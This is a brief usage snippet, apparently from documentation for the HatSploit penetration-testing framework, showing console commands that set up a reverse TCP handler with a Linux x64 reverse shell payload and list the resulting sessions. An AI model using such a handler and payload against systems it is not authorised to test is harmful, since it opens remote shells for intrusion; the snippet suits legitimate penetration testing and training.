# HatSploit

```assembly
sessions --auto-interaction off

use exploit/generic/handler/reverse_tcp
    set payload linux/x64/shell_reverse_tcp
run

sessions -l
```
